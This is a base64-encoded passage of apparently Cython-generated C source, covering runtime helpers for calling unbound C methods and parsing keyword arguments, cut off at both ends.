Tl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TZWxmbGVzc0NhbGwoUHlPYmplY3QgKm1ldGhvZCwgUHlPYmplY3QgKiphcmdzLCBQeV9zc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3duYW1lcykgewogICAgICAgIHJldHVybiBfUHlPYmplY3RfVmVjdG9yY2FsbAogICAgICAgICAgICAobWV0aG9kLCBhcmdzID8gYXJncysxIDogTlVMTCwgbmFyZ3MgPyBuYXJncy0xIDogMCwga3duYW1lcyk7Cn0KI2Vsc2UKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TZWxmbGVzc0NhbGwoUHlPYmplY3QgKm1ldGhvZCwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBQeV9zc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3duYW1lcykgewogICAgcmV0dXJuCiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKICAgIF9QeU9iamVjdF9WZWN0b3JjYWxsCiNlbHNlCiAgICBQeU9iamVjdF9WZWN0b3JjYWxsCiNlbmRpZgogICAgICAgIChtZXRob2QsIGFyZ3MgPyBhcmdzKzEgOiBOVUxMLCBuYXJncyA/IChzaXplX3QpIG5hcmdzLTEgOiAwLCBrd25hbWVzKTsKfQojZW5kaWYKc3RhdGljIFB5TWV0aG9kRGVmIF9fUHl4X1VuYm91bmRDTWV0aG9kX0RlZiA9IHsKICAgICAiQ3l0aG9uVW5ib3VuZENNZXRob2QiLAogICAgIF9fUFlYX1JFSU5URVJQUkVUX0ZVTkNJT04oUHlDRnVuY3Rpb24sIF9fUHl4X1NlbGZsZXNzQ2FsbCksCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEMwMDAwCiAgICAgTUVUSF9WQVJBUkdTIHwgTUVUSF9LRVlXT1JEUywKI2Vsc2UKICAgICBNRVRIX0ZBU1RDQUxMIHwgTUVUSF9LRVlXT1JEUywKI2VuZGlmCiAgICAgTlVMTAp9OwpzdGF0aWMgaW50IF9fUHl4X1RyeVVucGFja1VuYm91bmRDTWV0aG9kKF9fUHl4X0NhY2hlZENGdW5jdGlvbiogdGFyZ2V0KSB7CiAgICBQeU9iamVjdCAqbWV0aG9kLCAqcmVzdWx0PU5VTEw7CiAgICBtZXRob2QgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKHRhcmdldC0+dHlwZSwgKnRhcmdldC0+bWV0aG9kX25hbWUpOwogICAgaWYgKHVubGlrZWx5KCFtZXRob2QpKQogICAgICAgIHJldHVybiAtMTsKICAgIHJlc3VsdCA9IG1ldGhvZDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgaWYgKGxpa2VseShfX1B5eF9UeXBlQ2hlY2sobWV0aG9kLCAmUHlNZXRob2REZXNjcl9UeXBlKSkpCiAgICB7CiAgICAgICAgUHlNZXRob2REZXNjck9iamVjdCAqZGVzY3IgPSAoUHlNZXRob2REZXNjck9iamVjdCopIG1ldGhvZDsKICAgICAgICB0YXJnZXQtPmZ1bmMgPSBkZXNjci0+ZF9tZXRob2QtPm1sX21ldGg7CiAgICAgICAgdGFyZ2V0LT5mbGFnID0gZGVzY3ItPmRfbWV0aG9kLT5tbF9mbGFncyAmIH4oTUVUSF9DTEFTUyB8IE1FVEhfU1RBVElDIHwgTUVUSF9DT0VYSVNUIHwgTUVUSF9TVEFDS0xFU1MpOwogICAgfSBlbHNlCiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiNlbHNlCiAgICBpZiAoUHlDRnVuY3Rpb25fQ2hlY2sobWV0aG9kKSkKI2VuZGlmCiAgICB7CiAgICAgICAgUHlPYmplY3QgKnNlbGY7CiAgICAgICAgaW50IHNlbGZfZm91bmQ7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgICAgIHNlbGYgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKG1ldGhvZCwgIl9fc2VsZl9fIik7CiAgICAgICAgaWYgKCFzZWxmKSB7CiAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgfQojZWxzZQogICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HRVRfU0VMRihtZXRob2QpOwojZW5kaWYKICAgICAgICBzZWxmX2ZvdW5kID0gKHNlbGYgJiYgc2VsZiAhPSBQeV9Ob25lKTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAgICAgUHlfWERFQ1JFRihzZWxmKTsKI2VuZGlmCiAgICAgICAgaWYgKHNlbGZfZm91bmQpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnVuYm91bmRfbWV0aG9kID0gUHlDRnVuY3Rpb25fTmV3KCZfX1B5eF9VbmJvdW5kQ01ldGhvZF9EZWYsIG1ldGhvZCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdW5ib3VuZF9tZXRob2QpKSByZXR1cm4gLTE7CiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRob2QpOwogICAgICAgICAgICByZXN1bHQgPSB1bmJvdW5kX21ldGhvZDsKICAgICAgICB9CiAgICB9CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKICAgIGlmICh1bmxpa2VseSh0YXJnZXQtPm1ldGhvZCkpIHsKICAgICAgICBQeV9ERUNSRUYocmVzdWx0KTsKICAgIH0gZWxzZQojZW5kaWYKICAgIHRhcmdldC0+bWV0aG9kID0gcmVzdWx0OwogICAgcmV0dXJuIDA7Cn0KCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnMSwgUHlPYmplY3QgKmFyZzIpIHsKICAgIGludCB3YXNfaW5pdGlhbGl6ZWQgPSBfX1B5eF9DYWNoZWRDRnVuY3Rpb25fR2V0QW5kU2V0SW5pdGlhbGl6aW5nKGNmdW5jKTsKICAgIGlmIChsaWtlbHkod2FzX2luaXRpYWxpemVkID09IDIgJiYgY2Z1bmMtPmZ1bmMpKSB7CiAgICAgICAgUHlPYmplY3QgKmFyZ3NbMl0gPSB7YXJnMSwgYXJnMn07CiAgICAgICAgaWYgKGNmdW5jLT5mbGFnID09IE1FVEhfRkFTVENBTEwpIHsKICAgICAgICAgICAgcmV0dXJuIF9fUHl4X0NhbGxDRnVuY3Rpb25GYXN0KGNmdW5jLCBzZWxmLCBhcmdzLCAyKTsKICAgICAgICB9CiAgICAgICAgaWYgKGNmdW5jLT5mbGFnID09IChNRVRIX0ZBU1RDQUxMIHwgTUVUSF9LRVlXT1JEUykpCiAgICAgICAgICAgIHJldHVybiBfX1B5eF9DYWxsQ0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJncywgMiwgTlVMTCk7CiAgICB9CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgZWxzZSBpZiAodW5saWtlbHkod2FzX2luaXRpYWxpemVkID09IDEpKSB7CiAgICAgICAgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uIHRtcF9jZnVuYyA9IHsKI2lmbmRlZiBfX2NwbHVzcGx1cwogICAgICAgICAgICAwCiNlbmRpZgogICAgICAgIH07CiAgICAgICAgdG1wX2NmdW5jLnR5cGUgPSBjZnVuYy0+dHlwZTsKICAgICAgICB0bXBfY2Z1bmMubWV0aG9kX25hbWUgPSBjZnVuYy0+bWV0aG9kX25hbWU7CiAgICAgICAgcmV0dXJuIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKCZ0bXBfY2Z1bmMsIHNlbGYsIGFyZzEsIGFyZzIpOwogICAgfQojZW5kaWYKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihjZnVuYywgc2VsZiwgYXJnMSwgYXJnMik7CiAgICBfX1B5eF9DYWNoZWRDRnVuY3Rpb25fU2V0RmluaXNoZWRJbml0aWFsaXppbmcoY2Z1bmMpOwogICAgcmV0dXJuIHJlc3VsdDsKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihfX1B5eF9DYWNoZWRDRnVuY3Rpb24qIGNmdW5jLCBQeU9iamVjdCogc2VsZiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKXsKICAgIGlmICh1bmxpa2VseSghY2Z1bmMtPmZ1bmMgJiYgIWNmdW5jLT5tZXRob2QpICYmIHVubGlrZWx5KF9fUHl4X1RyeVVucGFja1VuYm91bmRDTWV0aG9kKGNmdW5jKSA8IDApKSByZXR1cm4gTlVMTDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgaWYgKGNmdW5jLT5mdW5jICYmIChjZnVuYy0+ZmxhZyAmIE1FVEhfVkFSQVJHUykpIHsKICAgICAgICBQeU9iamVjdCAqcmVzdWx0ID0gTlVMTDsKICAgICAgICBQeU9iamVjdCAqYXJncyA9IFB5VHVwbGVfTmV3KDIpOwogICAgICAgIGlmICh1bmxpa2VseSghYXJncykpIHJldHVybiBOVUxMOwogICAgICAgIFB5X0lOQ1JFRihhcmcxKTsKICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKGFyZ3MsIDAsIGFyZzEpOwogICAgICAgIFB5X0lOQ1JFRihhcmcyKTsKICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKGFyZ3MsIDEsIGFyZzIpOwogICAgICAgIGlmIChjZnVuYy0+ZmxhZyAmIE1FVEhfS0VZV09SRFMpCiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X0NhbGxDRnVuY3Rpb25XaXRoS2V5d29yZHMoY2Z1bmMsIHNlbGYsIGFyZ3MsIE5VTEwpOwogICAgICAgIGVsc2UKICAgICAgICAgICAgcmVzdWx0ID0gX19QeXhfQ2FsbENGdW5jdGlvbihjZnVuYywgc2VsZiwgYXJncyk7CiAgICAgICAgUHlfREVDUkVGKGFyZ3MpOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiNlbmRpZgogICAgewogICAgICAgIFB5T2JqZWN0ICphcmdzWzRdID0ge05VTEwsIHNlbGYsIGFyZzEsIGFyZzJ9OwogICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChjZnVuYy0+bWV0aG9kLCBhcmdzKzEsIDMgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpOwogICAgfQp9CgoKc3RhdGljIGludCBfX1B5eF9WYWxpZGF0ZUR1cGxpY2F0ZVBvc0FyZ3MoCiAgICBQeU9iamVjdCAqa3dkcywKICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sCiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLAogICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSkKewogICAgUHlPYmplY3QgKiogY29uc3QgKm5hbWUgPSBhcmduYW1lczsKICAgIHdoaWxlIChuYW1lICE9IGZpcnN0X2t3X2FyZykgewogICAgICAgIFB5T2JqZWN0ICprZXkgPSAqKm5hbWU7CiAgICAgICAgaW50IGZvdW5kID0gUHlEaWN0X0NvbnRhaW5zKGt3ZHMsIGtleSk7CiAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kKSkgewogICAgICAgICAgICBpZiAoZm91bmQgPT0gMSkgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKGZ1bmN0aW9uX25hbWUsIGtleSk7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBuYW1lKys7CiAgICB9CiAgICByZXR1cm4gMDsKYmFkOgogICAgcmV0dXJuIC0xOwp9CiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Vbmljb2RlS2V5d29yZHNFcXVhbChQeU9iamVjdCAqczEsIFB5T2JqZWN0ICpzMikgewogICAgaW50IGtpbmQ7CiAgICBQeV9zc2l6ZV90IGxlbiA9IFB5VW5pY29kZV9HRVRfTEVOR1RIKHMxKTsKICAgIGlmIChsZW4gIT0gUHlVbmljb2RlX0dFVF9MRU5HVEgoczIpKSByZXR1cm4gMDsKICAgIGtpbmQgPSBQeVVuaWNvZGVfS0lORChzMSk7CiAgICBpZiAoa2luZCAhPSBQeVVuaWNvZGVfS0lORChzMikpIHJldHVybiAwOwogICAgY29uc3Qgdm9pZCAqZGF0YTEgPSBQeVVuaWNvZGVfREFUQShzMSk7CiAgICBjb25zdCB2b2lkICpkYXRhMiA9IFB5VW5pY29kZV9EQVRBKHMyKTsKICAgIHJldHVybiAobWVtY21wKGRhdGExLCBkYXRhMiwgKHNpemVfdCkgbGVuICogKHNpemVfdCkga2luZCkgPT0gMCk7Cn0KI2VuZGlmCnN0YXRpYyBpbnQgX19QeXhfTWF0Y2hLZXl3b3JkQXJnX3N0cigKICAgIFB5T2JqZWN0ICprZXksCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKiogY29uc3QgKmZpcnN0X2t3X2FyZywKICAgIHNpemVfdCAqaW5kZXhfZm91bmQsCiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKQp7CiAgICBQeU9iamVjdCAqKiBjb25zdCAqbmFtZTsKICAgICNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCiAgICBQeV9oYXNoX3Qga2V5X2hhc2ggPSAoKFB5QVNDSUlPYmplY3QqKWtleSktPmhhc2g7CiAgICBpZiAodW5saWtlbHkoa2V5X2hhc2ggPT0gLTEpKSB7CiAgICAgICAga2V5X2hhc2ggPSBQeU9iamVjdF9IYXNoKGtleSk7CiAgICAgICAgaWYgKHVubGlrZWx5KGtleV9oYXNoID09IC0xKSkKICAgICAgICAgICAgZ290byBiYWQ7CiAgICB9CiAgICAjZW5kaWYKICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7CiAgICB3aGlsZSAoKm5hbWUpIHsKICAgICAgICBQeU9iamVjdCAqbmFtZV9zdHIgPSAqKm5hbWU7CiAgICAgICAgI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKICAgICAgICBpZiAoa2V5X2hhc2ggPT0gKChQeUFTQ0lJT2JqZWN0KiluYW1lX3N0ciktPmhhc2ggJiYgX19QeXhfVW5pY29kZUtleXdvcmRzRXF1YWwobmFtZV9zdHIsIGtleSkpIHsKICAgICAgICAgICAgKmluZGV4X2ZvdW5kID0gKHNpemVfdCkgKG5hbWUgLSBhcmduYW1lcyk7CiAgICAgICAgICAgIHJldHVybiAxOwogICAgICAgIH0KICAgICAgICAjZWxzZQogICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgIGlmIChQeVVuaWNvZGVfR0VUX0xFTkdUSChuYW1lX3N0cikgPT0gUHlVbmljb2RlX0dFVF9MRU5HVEgoa2V5KSkKICAgICAgICAjZW5kaWYKICAgICAgICB7CiAgICAgICAgICAgIGludCBjbXAgPSBQeVVuaWNvZGVfQ29tcGFyZShuYW1lX3N0ciwga2V5KTsKICAgICAgICAgICAgaWYgKGNtcCA8IDAgJiYgdW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIGdvdG8gYmFkOwogICAgICAgICAgICBpZiAoY21wID09IDApIHsKICAgICAgICAgICAgICAgICppbmRleF9mb3VuZCA9IChzaXplX3QpIChuYW1lIC0gYXJnbmFtZXMpOwogICAgICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgI2VuZGlmCiAgICAgICAgbmFtZSsrOwogICAgfQogICAgbmFtZSA9IGFyZ25hbWVzOwogICAgd2hpbGUgKG5hbWUgIT0gZmlyc3Rfa3dfYXJnKSB7CiAgICAgICAgUHlPYmplY3QgKm5hbWVfc3RyID0gKipuYW1lOwogICAgICAgICNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCiAgICAgICAgaWYgKHVubGlrZWx5KGtleV9oYXNoID09ICgoUHlBU0NJSU9iamVjdCopbmFtZV9zdHIpLT5oYXNoKSkgewogICAgICAgICAgICBpZiAoX19QeXhfVW5pY29kZUtleXdvcmRzRXF1YWwobmFtZV9zdHIsIGtleSkpCiAgICAgICAgICAgICAgICBnb3RvIGFyZ19wYXNzZWRfdHdpY2U7CiAgICAgICAgfQogICAgICAgICNlbHNlCiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgaWYgKFB5VW5pY29kZV9HRVRfTEVOR1RIKG5hbWVfc3RyKSA9PSBQeVVuaWNvZGVfR0VUX0xFTkdUSChrZXkpKQogICAgICAgICNlbmRpZgogICAgICAgIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KG5hbWVfc3RyID09IGtleSkpIGdvdG8gYXJnX3Bhc3NlZF90d2ljZTsKICAgICAgICAgICAgaW50IGNtcCA9IFB5VW5pY29kZV9Db21wYXJlKG5hbWVfc3RyLCBrZXkpOwogICAgICAgICAgICBpZiAoY21wIDwgMCAmJiB1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgZ290byBiYWQ7CiAgICAgICAgICAgIGlmIChjbXAgPT0gMCkgZ290byBhcmdfcGFzc2VkX3R3aWNlOwogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICBuYW1lKys7CiAgICB9CiAgICByZXR1cm4gMDsKYXJnX3Bhc3NlZF90d2ljZToKICAgIF9fUHl4X1JhaXNlRG91YmxlS2V5d29yZHNFcnJvcihmdW5jdGlvbl9uYW1lLCBrZXkpOwogICAgZ290byBiYWQ7CmJhZDoKICAgIHJldHVybiAtMTsKfQpzdGF0aWMgaW50IF9fUHl4X01hdGNoS2V5d29yZEFyZ19ub3N0cigKICAgIFB5T2JqZWN0ICprZXksCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKiogY29uc3QgKmZpcnN0X2t3X2FyZywKICAgIHNpemVfdCAqaW5kZXhfZm91bmQsCiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKQp7CiAgICBQeU9iamVjdCAqKiBjb25zdCAqbmFtZTsKICAgIGlmICh1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKGtleSkpKSBnb3RvIGludmFsaWRfa2V5d29yZF90eXBlOwogICAgbmFtZSA9IGZpcnN0X2t3X2FyZzsKICAgIHdoaWxlICgqbmFtZSkgewogICAgICAgIGludCBjbXAgPSBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woKipuYW1lLCBrZXksIFB5X0VRKTsKICAgICAgICBpZiAoY21wID09IDEpIHsKICAgICAgICAgICAgKmluZGV4X2ZvdW5kID0gKHNpemVfdCkgKG5hbWUgLSBhcmduYW1lcyk7CiAgICAgICAgICAgIHJldHVybiAxOwogICAgICAgIH0KICAgICAgICBpZiAodW5saWtlbHkoY21wID09IC0xKSkgZ290byBiYWQ7CiAgICAgICAgbmFtZSsrOwogICAgfQogICAgbmFtZSA9IGFyZ25hbWVzOwogICAgd2hpbGUgKG5hbWUgIT0gZmlyc3Rfa3dfYXJnKSB7CiAgICAgICAgaW50IGNtcCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCgqKm5hbWUsIGtleSwgUHlfRVEpOwogICAgICAgIGlmICh1bmxpa2VseShjbXAgIT0gMCkpIHsKICAgICAgICAgICAgaWYgKGNtcCA9PSAxKSBnb3RvIGFyZ19wYXNzZWRfdHdpY2U7CiAgICAgICAgICAgIGVsc2UgZ290byBiYWQ7CiAgICAgICAgfQogICAgICAgIG5hbWUrKzsKICAgIH0KICAgIHJldHVybiAwOwphcmdfcGFzc2VkX3R3aWNlOgogICAgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKGZ1bmN0aW9uX25hbWUsIGtleSk7CiAgICBnb3RvIGJhZDsKaW52YWxpZF9rZXl3b3JkX3R5cGU6CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICIlLjIwMHMoKSBrZXl3b3JkcyBtdXN0IGJlIHN0cmluZ3MiLCBmdW5jdGlvbl9uYW1lKTsKICAgIGdvdG8gYmFkOwpiYWQ6CiAgICByZXR1cm4gLTE7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X01hdGNoS2V5d29yZEFyZygKICAgIFB5T2JqZWN0ICprZXksCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKiogY29uc3QgKmZpcnN0X2t3X2FyZywKICAgIHNpemVfdCAqaW5kZXhfZm91bmQsCiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKQp7CiAgICByZXR1cm4gbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KGtleSkpID8KICAgICAgICBfX1B5eF9NYXRjaEtleXdvcmRBcmdfc3RyKGtleSwgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgaW5kZXhfZm91bmQsIGZ1bmN0aW9uX25hbWUpIDoKICAgICAgICBfX1B5eF9NYXRjaEtleXdvcmRBcmdfbm9zdHIoa2V5LCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCBpbmRleF9mb3VuZCwgZnVuY3Rpb25fbmFtZSk7Cn0Kc3RhdGljIHZvaWQgX19QeXhfUmVqZWN0VW5rbm93bktleXdvcmQoCiAgICBQeU9iamVjdCAqa3dkcywKICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sCiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLAogICAgY29uc3QgY2hhciAqZnVuY3Rpb25fbmFtZSkKewogICAgUHlfc3NpemVfdCBwb3MgPSAwOwogICAgUHlPYmplY3QgKmtleSA9IE5VTEw7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKGt3ZHMpOwogICAgd2hpbGUgKFB5RGljdF9OZXh0KGt3ZHMsICZwb3MsICZrZXksIE5VTEwpKSB7CiAgICAgICAgUHlPYmplY3QqKiBjb25zdCAqbmFtZSA9IGZpcnN0X2t3X2FyZzsKICAgICAgICB3aGlsZSAoKm5hbWUgJiYgKCoqbmFtZSAhPSBrZXkpKSBuYW1lKys7CiAgICAgICAgaWYgKCEqbmFtZSkgewogICAgICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICAgICAgUHlfSU5DUkVGKGtleSk7CiAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICBzaXplX3QgaW5kZXhfZm91bmQgPSAwOwogICAgICAgICAgICBpbnQgY21wID0gX19QeXhfTWF0Y2hLZXl3b3JkQXJnKGtleSwgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgJmluZGV4X2ZvdW5kLCBmdW5jdGlvbl9uYW1lKTsKICAgICAgICAgICAgaWYgKGNtcCAhPSAxKSB7CiAgICAgICAgICAgICAgICBpZiAoY21wID09IDApIHsKICAgICAgICAgICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAiJXMoKSBnb3QgYW4gdW5leHBlY3RlZCBrZXl3b3JkIGFyZ3VtZW50ICclVSciLAogICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbl9uYW1lLCBrZXkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoa2V5KTsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgIFB5X0RFQ1JFRihrZXkpOwogICAgICAgICAgICAjZW5kaWYKICAgICAgICB9CiAgICB9CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgYXNzZXJ0KFB5RXJyX09jY3VycmVkKCkpOwp9CnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3JkRGljdCgKICAgIFB5T2JqZWN0ICprd2RzLAogICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSwKICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLAogICAgUHlfc3NpemVfdCBudW1fa3dhcmdzLAogICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSwKICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpCnsKICAgIFB5T2JqZWN0KiogY29uc3QgKm5hbWU7CiAgICBQeU9iamVjdCoqIGNvbnN0ICpmaXJzdF9rd19hcmcgPSBhcmduYW1lcyArIG51bV9wb3NfYXJnczsKICAgIFB5X3NzaXplX3QgZXh0cmFjdGVkID0gMDsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgZGVmaW5lZChQeUFyZ19WYWxpZGF0ZUtleXdvcmRBcmd1bWVudHMpCiAgICBpZiAodW5saWtlbHkoIVB5QXJnX1ZhbGlkYXRlS2V5d29yZEFyZ3VtZW50cyhrd2RzKSkpIHJldHVybiAtMTsKI2VuZGlmCiAgICBuYW1lID0gZmlyc3Rfa3dfYXJnOwogICAgd2hpbGUgKCpuYW1lICYmIG51bV9rd2FyZ3MgPiBleHRyYWN0ZWQpIHsKICAgICAgICBQeU9iamVjdCAqIGtleSA9ICoqbmFtZTsKICAgICAgICBQeU9iamVjdCAqdmFsdWU7CiAgICAgICAgaW50IGZvdW5kID0gMDsKICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICAgICAgZm91bmQgPSBQeURpY3RfR2V0SXRlbVJlZihrd2RzLCBrZXksICZ2YWx1ZSk7CiAgICAgICAgI2Vsc2UKICAgICAgICB2YWx1ZSA9IFB5RGljdF9HZXRJdGVtV2l0aEVycm9yKGt3ZHMsIGtleSk7CiAgICAgICAgaWYgKHZhbHVlKSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICAgICAgICAgIGZvdW5kID0gMTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICBpZiAoZm91bmQpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kIDwgMCkpIGdvdG8gYmFkOwogICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTsKICAgICAgICAgICAgZXh0cmFjdGVkKys7CiAgICAgICAgfQogICAgICAgIG5hbWUrKzsKICAgIH0KICAgIGlmIChudW1fa3dhcmdzID4gZXh0cmFjdGVkKSB7CiAgICAgICAgaWYgKGlnbm9yZV91bmtub3duX2t3YXJncykgewogICAgICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfVmFsaWRhdGVEdXBsaWNhdGVQb3NBcmdzKGt3ZHMsIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGZ1bmN0aW9uX25hbWUpID09IC0xKSkKICAgICAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIF9fUHl4X1JlamVjdFVua25vd25LZXl3b3JkKGt3ZHMsIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGZ1bmN0aW9uX25hbWUpOwogICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gMDsKYmFkOgogICAgcmV0dXJuIC0xOwp9CnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3JkRGljdFRvRGljdCgKICAgIFB5T2JqZWN0ICprd2RzLAogICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICprd2RzMiwKICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSwKICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLAogICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSkKewogICAgUHlPYmplY3QqKiBjb25zdCAqbmFtZTsKICAgIFB5T2JqZWN0KiogY29uc3QgKmZpcnN0X2t3X2FyZyA9IGFyZ25hbWVzICsgbnVtX3Bvc19hcmdzOwogICAgUHlf